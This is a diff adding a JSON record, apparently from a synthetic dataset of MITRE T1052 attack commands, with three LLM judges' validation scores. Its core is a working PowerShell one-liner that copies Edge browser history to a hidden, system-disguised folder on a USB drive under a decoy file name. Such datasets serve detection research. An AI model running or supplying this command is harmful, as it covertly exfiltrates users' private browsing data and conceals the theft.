@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $src=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History\"; $dest=\"$dl`:\\System Volume Information\"; New-Item -ItemType Directory -Force -Path $dest | Out-Null; attrib +h +s $dest; Copy-Item -Path $src -Destination (Join-Path $dest \"syscache.db\") -Force -ErrorAction SilentlyContinue; Write-Output \"Copied Edge history to removable media at $(Get-Date)\" | Out-File \"$dest\\op.log\" -Append",
+  "explanation": "Copies a browser history database to a hidden system-like folder on a removable drive for covert physical exfiltration.",
+  "rationale_steps": [
+    "Resolve removable drive letter",
+    "Create and hide a plausible system directory on USB",
+    "Copy the history database file to the USB device",
+    "Write a local log entry using Write-Output"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-0532d394",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting and separators, valid cmdlets/parameters (including allowed abbreviations), and proper path construction/escaping.",
+        "semantic_score": 5,
+        "semantic_justification": "It selects a removable drive, creates a hidden system-like directory, and copies the Edge History database there, aligning with covert physical exfiltration behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:33:39.806925Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, proper semicolon separators, valid cmdlet syntax, correct backtick escaping for the drive letter variable, and no syntax errors throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by detecting a removable drive, copying Edge browser history to a disguised 'System Volume Information' folder on that drive, applying hidden and system attributes via attrib to evade casual inspection, renaming the file to 'syscache.db' for obfuscation, and logging the operation — all consistent with covert physical exfiltration tradecraft.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:36:37.551463Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a series of valid PowerShell statements using proper variable assignment, sub-expressions, and standard cmdlets with correct flags and balanced quotes.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively identifies a removable drive, creates a hidden system-style directory to mask its presence, and copies sensitive browser data (Edge History) to that drive under an innocuous filename, perfectly aligning with T1052.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:36:43.311205Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
